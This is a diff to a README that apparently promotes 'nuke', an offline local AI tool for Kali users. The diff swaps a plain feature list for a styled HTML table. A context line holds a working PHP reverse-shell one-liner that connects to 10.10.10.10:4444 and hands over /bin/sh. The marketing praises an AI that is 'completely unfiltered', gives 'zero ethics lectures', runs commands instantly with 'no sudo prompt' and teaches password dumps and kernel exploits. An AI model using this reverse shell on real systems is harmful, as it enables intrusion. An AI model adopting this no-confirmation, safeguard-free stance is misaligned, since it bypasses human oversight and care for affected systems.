@@ -32,12 +32,17 @@ php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
 Why every red teamer, CTF player & script kiddie is installing this right now..!
+<div style="background: linear-gradient(135deg, #000, #11002a); padding: 25px; border-radius: 15px; border: 2px solid #00ff00; box-shadow: 0 0 30px #00ff0044; max-width: 800px;">
 
-**Feature,What it means for you
-Press r → executes,No more copy-paste. Just detonate.
-100% offline,Works in air-gapped labs & dark rooms
-Unfiltered,Teaches everything — even the forbidden stuff
-8–16 GB optimized,Runs perfectly on normal laptops (qwen2.5:14b)
-Zero ethics lectures,You asked for power. You get power.**
+### <span style="color:#00ff00; text-shadow: 0 0 10px #0f0;">Why nuke is taking over every Kali machine in 2025</span>
 
+| <span style="color:#ff0040;">Feature</span>                  | <span style="color:#00ff00;">Reality</span>                                 |
+|---------------------------------------------------------------|---------------------------------------------------------------------|
+| Press **r** → command executes instantly                   | No copy-paste. No sudo prompt. Just destruction.                    |
+| 100% offline & private                                       | Works in bunkers, CTFs, red te — no internet needed         |
+| Completely unfiltered                                        | Teaches kernel exploits, password dumps, privilege escalation…     |
+| Built for 8–16 GB laptops                                    | Runs perfectly on your $400 ThinkPad                               |
+| Made by <span style="color:#00ff00;">wtf.mr</span>           | The guy who doesn’t read man pages — he burns them                 |
+
+</div>
 
